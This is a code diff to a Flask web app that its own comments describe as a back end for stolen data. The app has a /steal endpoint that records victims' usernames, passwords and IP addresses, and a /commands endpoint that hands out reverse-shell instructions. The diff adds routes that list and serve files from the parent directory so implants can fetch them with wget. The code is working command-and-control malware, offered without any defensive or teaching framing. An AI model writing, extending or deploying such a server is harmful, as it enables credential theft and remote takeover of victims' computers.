@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, session, flash, render_template_string, send_file
+from flask import Flask, render_template, request, redirect, url_for, session, flash, render_template_string, send_file, send_from_directory
 import sqlite3
 import os
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -10,6 +10,7 @@ REGISTRATION_KEY = secrets.token_urlsafe(32)
 
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
 
+# HTML template for homepage
 html = '''<head>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
 </head>
@@ -99,11 +100,13 @@ color: #155724;
 BODY
 </body>'''
 
+# Gets db connections
 def get_db_connection():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
     return conn
 
+# Initializes database
 def create_db():
     conn = get_db_connection()
     cur = conn.cursor()
@@ -123,6 +126,7 @@ def create_db():
     conn.commit()
     conn.close()
 
+# Inserts stolen data into database
 def insert_data(username, password, ip, timestamp):
     conn = get_db_connection()
     cur = conn.cursor()
@@ -130,6 +134,7 @@ def insert_data(username, password, ip, timestamp):
     conn.commit()
     conn.close()
 
+# Retrieves stolen info from database
 def get_data():
     conn = get_db_connection()
     cur = conn.cursor()
@@ -137,6 +142,7 @@ def get_data():
     conn.close()
     return data
 
+# Homepage
 @app.route("/")
 def home():
     if 'username' in session:
@@ -178,6 +184,7 @@ def home():
         html_page = html.replace("BODY", "<h2>Nothing to see here...</h2>")
         return render_template_string(html_page)
 
+# Form to send the sotlen info through
 @app.route('/steal', methods=['POST'])
 def steal():
     username = request.form.get('username')
@@ -187,6 +194,7 @@ def steal():
     insert_data(username, password, ip, timestamp)
     return ""
 
+# Form to get commands to run
 @app.route('/commands', methods=['POST'])
 def command():
     type = request.form.get('type')
@@ -196,6 +204,7 @@ def command():
         return f'REVERSE port={port} ip={ip}'
     return ""
 
+# Login route
 @app.route('/login', methods=['POST'])
 def login():
      if request.method == 'POST':
@@ -217,6 +226,7 @@ def login():
             flash('Invalid username or password!', 'error')
             return redirect(url_for('home'))
 
+# Form to register, only accesible via terminal commands
 @app.route('/register', methods=['POST'])
 def register():
     username = request.form.get('username')
@@ -237,12 +247,14 @@ def register():
     except sqlite3.IntegrityError:
         return 'Username already exists.'
     
+# Logout
 @app.route('/logout', methods=['POST'])
 def logout():
     session.pop('username')
     flash('Logged out successfully.', 'success')
     return redirect(url_for('home'))
 
+# Deletes last entry in the database (for debugging)
 @app.route('/delete-last', methods=['POST'])
 def delete_last_entry():
     conn = get_db_connection()
@@ -252,9 +264,19 @@ def delete_last_entry():
     conn.close()
     return 'Last entry deleted.'
 
-@app.route('/files/pseudo.c', methods=['POST'])
-def send_pseudo():
-    return send_file('../pseudo.c', as_attachment=True)
+# Just a page that will list all the files so we can retrieve them using wget
+@app.route('/files/')
+def list_files():
+    files = os.listdir('../')
+    files_html = '\n'.join(
+        f'<li><a href="/files/{file}">{file}</a></li>' for file in files
+    )
+    return f"<ul>{files_html}</ul>"
+
+# Retrieving files
+@app.route('/files/<path:filename>')
+def download_file(filename):
+    return send_from_directory('../', filename)
     
 if __name__ == "__main__":
     create_db()
